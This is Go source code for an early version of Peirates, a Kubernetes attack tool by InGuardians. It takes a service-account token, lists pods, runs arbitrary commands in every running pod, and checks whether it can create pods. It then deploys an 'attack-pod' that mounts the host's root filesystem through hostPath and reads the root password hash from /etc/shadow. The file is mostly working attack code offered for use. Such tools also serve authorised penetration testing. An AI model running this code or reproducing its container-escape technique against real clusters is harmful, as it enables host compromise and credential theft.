// Peirates - an Attack tool for Kubernetes clusters
//
// You need to use "package main" for executables
//
// BTW always run `go fmt` before you check in code. go fmt is law.
//
package main

// Imports. If you don't use an import that's an error so
// I haven't imported json yet.
// Also, number one rule of Go: Try to stick to the
// standard library as much as possible
import (
	"bytes"
	"flag" // Command line flag parsing
	"fmt"  // String formatting (Printf, Sprintf)
	"io"
	"io/ioutil" // Utils for dealing with IO streams
	"log"       // Logging utils
	"math/rand" // Random module for creating random string building
	"net/http"  // HTTP client/server
	"os/exec"
	"regexp"
	"strings"
	"time" // Time modules

	// kubernetes client
	//"k8s.io/client-go/tools/clientcmd"
	kubectl "k8s.io/kubernetes/pkg/kubectl/cmd"

	// Packages belonging to Peirates go here
	"gitlab.inguardians.com/agents/peirates/config"
)

// Struct type definition to contain our options. This is
// different from the original python code that had each
// of the options as top-level variables
// type ServerInfo struct {
// 	RIPAddress string
// 	RPort      string
// 	Token      string //pass token  via command line
// 	CAPath     string //path to ca certificate
// 	Namespace  string // namespace that this pod's service account is tied to
// }

// Function to parse options. We call it in main()
func parseOptions(connectionString *config.ServerInfo, podList *Pod_List) {
	// This is like the parser.add_option stuff except
	// it works implicitly on a global parser instance.
	// Notice the use of pointers (&connectionString.RIPAddress for
	// example) to bind flags to variables
	flag.StringVar(&connectionString.RIPAddress, "i", "10.23.58.40", "Remote IP address: ex. 10.22.34.67")
	flag.StringVar(&connectionString.RPort, "p", "6443", "Remote Port: ex 10255, 10250")
	flag.StringVar(&podList.arg, "L", "", "List of comma seperated Pods: ex pod1,pod2,pod3")
	flag.StringVar(&podList.command, "c", "hostname", "Command to run in pods")
	// flag.BoolVar(&connectionString.infoPods, "e", false, "Export pod information from remote Kubernetes server via curl")

	// JAY / TODO: println("FIXME: parseOptions clobbers config.Builder()")

	// flag.StringVar(&connectionString.Token, "t", "", "Token to be used for accessing Kubernetes server")
	// flag.StringVar(&connectionString.CAPath, "c", "", "Path to CA certificate")

	// This is the function that actually runs the parser
	// once you've defined all your options.
	flag.Parse()

	// If the IP or Port are their empty string, we want
	// to just print out usage and crash because they have
	// to be defined
	if connectionString.RIPAddress == "" {
		// flag.Usage() prints out an auto-generated usage string.
		flag.Usage()
		// log.Fatal prints a message to stderr and crashes the program.
		log.Fatal("Error: must provide remote IP address (-i)")
	}
	if connectionString.RPort == "" {
		// Same as before
		flag.Usage()
		log.Fatal("Error: must provide remote Port (-p)")
	}

	if podList.arg != "" {
		for _, v := range strings.Split(podList.arg, ",") {
			podList.list = append(podList.list, v)
		}
	}

}

// get_pod_list() returns an array of pod names, parsed from kubectl get pods
func get_pod_list(connectionString config.ServerInfo) []string {

	var pods []string

	getPodsRaw, _, err := runKubectlSimple(connectionString, "get", "pods")
	if err != nil {
		log.Fatal(err)
	}
	// Iterate over kubectl get pods, stripping off the first line which matches NAME and then grabbing the first column

	lines := strings.Split(string(getPodsRaw), "\n")
	for _, line := range lines {
		matched, err := regexp.MatchString(`^\s*$`, line)
		if err != nil {
			log.Fatal(err)
		}
		if !matched {
			//added checking to only enumerate running pods
			if strings.Fields(line)[2] == "Running" {
				pod := strings.Fields(line)[0]
				if pod != "NAME" {
					pods = append(pods, pod)
				}
			}
		}
	}

	return pods
}

// getHostname() runs kubectl with connection string to get hostname from pod
func getHostname(connectionString config.ServerInfo, PodName string) string {
	hostname, _, err := runKubectlSimple(connectionString, "exec", "-it", PodName, "hostname")
	if err != nil {
		fmt.Println("- Checking for hostname of pod "+PodName+" failed: ", err)
		return "- Pod command exec failed for " + PodName + "\n"
	} else {
		return "+ Pod discovered: " + string(hostname)
	}
}

func runKubectl(stdin io.Reader, stdout, stderr io.Writer, cmdArgs ...string) error {
	// Based on code from https://github.com/kubernetes/kubernetes/blob/2e0e1681a6ca7fe795f3bd5ec8696fb14687b9aa/cmd/kubectl/kubectl.go#L44

	// NewKubectlCommand adds the global flagset for some reason, so we have to
	// copy it, temporarily replace it, and then restore it.
	oldFlagSet := flag.CommandLine
	flag.CommandLine = flag.NewFlagSet("kubectl", flag.ExitOnError)
	cmd := kubectl.NewKubectlCommand(stdin, stdout, stderr)
	flag.CommandLine = oldFlagSet
	cmd.SetArgs(cmdArgs)
	return cmd.Execute()
}

// runKubectlWithConfig takes a server config, and a list of arguments. It executes kubectl internally,
// setting the namespace, token, certificate authority, and server based on the provided config, and
// appending the supplied arguments to the end of the command.
func runKubectlWithConfig(cfg config.ServerInfo, stdin io.Reader, stdout, stderr io.Writer, cmdArgs ...string) error {
	connArgs := []string{
		"-n", cfg.Namespace,
		"--token=" + cfg.Token,
		"--certificate-authority=" + cfg.CAPath,
		"--server=https://" + cfg.RIPAddress + ":" + cfg.RPort,
	}
	return runKubectl(stdin, stdout, stderr, append(connArgs, cmdArgs...)...)
}

// runKubectlSimple executes runKubectlWithConfig, but supplies nothing for stdin, and aggregates
// the stdout and stderr streams into strings. It returns (stdout, stderr, execution error).
// This function is what you want to use most of the time.
func runKubectlSimple(cfg config.ServerInfo, cmdArgs ...string) ([]byte, []byte, error) {
	stdin := strings.NewReader("")
	stdout := bytes.Buffer{}
	stderr := bytes.Buffer{}

	err := runKubectlWithConfig(cfg, stdin, &stdout, &stderr, cmdArgs...)

	return stdout.Bytes(), stderr.Bytes(), err
}

// canCreatePods() runs kubectl to check if current token can create a pod
func canCreatePods(connectionString config.ServerInfo) bool {
	canCreateRaw, _, err := runKubectlSimple(connectionString, "auth", "can-i", "create", "pod")
	if err != nil {
		return false
	} else {
		if strings.Contains(string(canCreateRaw), "yes") {
			return true
		} else {
			return false
		}
	}

}

// inAPod() runs mount on the local system and then checks if output contains kubernetes
func inAPod(connectionString config.ServerInfo) bool {
	mount_output_bs, err := exec.Command("mount").Output()
	if err != nil {
		fmt.Println("Checking if we are running in a Pod failed: ", err)
		return false
	} else {
		mount_output := string(mount_output_bs)
		return strings.Contains(mount_output, "kubernetes")
	}

}

// execInAllPods() runs podList.command in all running pods
func execInAllPods(connectionString config.ServerInfo, podList Pod_List) {
	runningPods := get_pod_list(connectionString)
	for _, execPod := range runningPods {
		execInPodOut, _, err := runKubectlSimple(connectionString, "exec", "-it", execPod, podList.command)
		if err != nil {
			fmt.Println("- Executing "+podList.command+" in Pod "+execPod+" failed: ", err)
		} else {
			fmt.Println("+ Executing " + podList.command + " in Pod " + execPod + " succeded: ")
			fmt.Println("\t" + string(execInPodOut))
		}
	}

}

// execInListPods() runs podList.command in all pods in podList.list
func execInListPods(connectionString config.ServerInfo, podList Pod_List) {
	fmt.Println("+ Running supplied command in list of pods")
	for _, execPod := range podList.list {

		execInPodOut, _, err := runKubectlSimple(connectionString, "exec", "-it", execPod, podList.command)
		if err != nil {
			fmt.Println("- Executing "+podList.command+" in Pod "+execPod+" failed: ", err)
		} else {
			fmt.Println("+ Executing " + podList.command + " in Pod " + execPod + " succeded: ")
			fmt.Println("\t" + string(execInPodOut))
		}
	}

}

// Here's the requestme equivalent.
func requestme(connectionString config.ServerInfo, location string) {
	// Make a request, getting a response and possibly an error.
	// fmt.Sprintf is a function which acts like printf() except it returns a string.
	res, err := http.Get(fmt.Sprintf("http://%s:%s/%s", connectionString.RIPAddress, connectionString.RPort, location))

	// These three lines are a common idiom when you just want to crash if an error happens.
	if err != nil {
		// Remember, log.Fatal() prints to stderr and then crashes.
		log.Fatal(err)
	}

	// Read the entire response into memory.
	contents, err := ioutil.ReadAll(res.Body)
	if err != nil {
		log.Fatal(err)
	}

	// "contents" is a byte slice ([]byte). We use
	// string() to convert it to a string type.
	// The difference is that the string type is for
	// UTF-8 strings specifically, while the byte slice
	// type is for any sort of binary data. However, in
	// this case, we know the server is returning back
	// text data. If we did not convert it, println()
	// would print the pointer of the byte slice instead
	// of the actual string
	println(string(contents))
}

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// Added mountFS code to create yaml file drop to disk and create a pod.    |
//--------------------------------------------------------------------------|

func init() {
	rand.Seed(time.Now().UnixNano())
}

//var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func randSeq(n int) string {
	letters := []rune("abcdefghijklmnopqrstuvwxyz")
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

//struct for PodList
type Pod_List struct {
	list    []string
	arg     string
	command string
}

type Mount_Info struct {
	yaml_build string
	image      string
	namespace  string
}

func Mount_RootFS(all_pods_listme []string, connectionString config.ServerInfo) {
	var Mount_InfoVars = Mount_Info{}
	// fmt.Println("DEBUG: grabbing image from pod: ", string(all_pods_listme[3]))
	//Get pods
	//# Get the first pod from all_pod_listme
	//pod_to_examine = all_pod_listme[0]

	//# Run a kubectl command to get YAML
	//yaml_output = kubectl -n ...  --token .... --ca ... get pod $pod_to_examine -o yaml

	//# Parse yaml output to get the image name
	//image_name = `grep "- image" yaml_output | awk '{print $3}'`

	get_images_raw, err := exec.Command("kubectl", "-n", connectionString.Namespace, "--token="+connectionString.Token, "--certificate-authority="+connectionString.CAPath, "--server=https://"+connectionString.RIPAddress+":"+connectionString.RPort, "get", "deployments", "-o", "wide", "--sort-by", "metadata.creationTimestamp").Output()
	get_image_lines := strings.Split(string(get_images_raw), "\n")
	for _, line := range get_image_lines {
		matched, err := regexp.MatchString(`^\s*$`, line)
		if err != nil {
			log.Fatal(err)
		}
		if !matched {
			//added checking to only enumerate running pods
			Mount_InfoVars.image = strings.Fields(line)[7]
			fmt.Println("[+] This is the Mount_InfoVars.Image output: ", Mount_InfoVars.image)
		}
	}

	if err != nil {
		log.Fatal(err)
	}

	//creat random  string
	random_string := randSeq(6)

	// Create Yaml File
	Mount_InfoVars.yaml_build = fmt.Sprintf(`apiVersion: v1
kind: Pod
metadata:
  annotations:
  labels:
  name: attack-pod-%s
  namespace: %s
spec:
  containers:
  - image: %s
    imagePullPolicy: IfNotPresent
    name: attack-container
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
`, random_string, connectionString.Namespace, Mount_InfoVars.image)

	// Write yaml file out to current directory
	ioutil.WriteFile("attack-pod.yaml", []byte(Mount_InfoVars.yaml_build), 0700)

	_, _, err = runKubectlSimple(connectionString, "apply", "-f", "attack-pod.yaml")
	if err != nil {
		log.Fatal(err)
	} else {
		attack_pod_name := "attack-pod-" + random_string
		println("Executing code in " + attack_pod_name + " to get its underlying host's root password hash")
		time.Sleep(2 * time.Second)
		shadow_file_bs, _, err := runKubectlSimple(connectionString, "exec", "-it", attack_pod_name, "grep", "root", "/root/etc/shadow")
		if err != nil {
			log.Fatal(err)
		} else {
			println(string(shadow_file_bs))
		}
	}
	//out, err = exec.Command("").Output()
	//if err != nil {
	//	fmt.Println("Token location error: ", err)
	//}
	//fmt.Println(out)
}

//------------------------------------------------------------------------------------------------------------------------------------------------

func main() {

	// Create a global variable named "connectionString" initialized to
	// default values
	var connectionString config.ServerInfo = config.Builder()
	var podList Pod_List
	//podList.arg =""
	//podList.list = {}

	// Run the option parser to initialize connectionStrings
	println(`Peirates
	________________________________________
	|  ___  ____ _ ____ ____ ___ ____ ____ |
	|  |__] |___ | |__/ |__|  |  |___ [__  |
	|  |    |___ | |  \ |  |  |  |___ ___] |
	|______________________________________|
	,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
	,,,,,,,,,,,,,.............:,,,,,,,,,,,,,
	,,,,,,,,,,...,IIIIIIIIIII+...,,,,,,,,,,,
	,,,,,,,:..~IIIIIIIIIIIIIIIIII...,,,,,,,,
	,,,,,,..?IIIIIII.......IIIIIIII..,,,,,,,
	,,,,,..IIIIIIII...II?...?IIIIIII,..,,,,,
	,,,:..IIIIIIII..:IIIIII..?IIIIIIII..,,,,
	,,,..IIIIIIIII..IIIIIII...IIIIIIII7.:,,,
	,,..IIIIIIIII.............IIIIIIIII..,,,
	,,.=IIIIIIII...~~~~~~~~~...IIIIIIIII..,,
	,..IIIIIIII...+++++++++++,..+IIIIIII..,,
	,..IIIIIII...+++++++++++++:..~IIIIII..,,
	,..IIIIII...++++++:++++++++=..,IIIII..,,
	,..IIIII...+....,++.++++:+.++...IIII..,,
	,,.+IIII...+..,+++++....+,.+...IIIII..,,
	,,..IIIII...+++++++++++++++...IIIII..:,,
	,,,..IIIII...+++++++++++++...IIIII7..,,,
	,,,,.,IIIII...+++++++++++...?IIIII..,,,,
	,,,,:..IIIII...............IIIII?..,,,,,
	,,,,,,..IIIII.............IIIII..,,,,,,,
	,,,,,,,,..7IIIIIIIIIIIIIIIII?...,,,,,,,,
	,,,,,,,,,:...?IIIIIIIIIIII....,,,,,,,,,,
	,,,,,,,,,,,,:.............,,,,,,,,,,,,,,
	,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
	,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
	________________________________________`)

	println("\n\nPeirates v1.00 by InGuardians")
	println("https://www.inguardians.com/labs/\n")
	parseOptions(&connectionString, &podList)

	if inAPod(connectionString) {
		println("+ You are in a pod.")
	} else {
		println("- You are not in a Kubernetes pod.")
	}

	all_pods := get_pod_list(connectionString)

	for _, pod := range all_pods {
		// JAY / TODO: Put me back
		//println("Checking out pod: " + pod)
		print(getHostname(connectionString, pod))
	}

	pod_creation := canCreatePods(connectionString)
	if pod_creation {
		println("+ This token can create pods on the cluster")
	} else {
		println(" This token cannot create pods on the cluster")
	}

	Mount_RootFS(all_pods, connectionString)

	execInAllPods(connectionString, podList)

	println("+ Pod list contains:")
	for _, pod := range podList.list {
		println("\t" + pod)
	}
	execInListPods(connectionString, podList)
	// This part is direct conversion from the python
	// Note that we use println() instead of print().
	// In go, print() does not add a newline while
	// println() does.
	/*	if connectionString.infoPods {
			requestme("pods")
			println("---------------------------")
			println("Extracting Pods via Curl  | ")
			println("--------------------------------------------------------------------------------------->")
			requestme("pods")
			println("--------------------------------------------------------------------------------------->")
			requestme("stats")
			requestme("stats/summary")
			requestme("stats/container")
			requestme("metrics")
			requestme("healthz")
		}
	*/
}

// Example of a multi-line comment
/*
https://10.23.58.40:6443/api
https://10.23.58.40:6443/api/v1
https://10.23.58.40:6443/apis
https://10.23.58.40:6443/apis/apps
https://10.23.58.40:6443/apis/batch
https://10.23.58.40:6443/apis/extentions
https://10.23.58.40:6443/apis/policy
https://10.23.58.40:6443/version
https://10.23.58.40:6443/apis/apps/v1/proxy (500)
https://10.23.58.40:6443/apis/apps/v1/watch (500)
*/
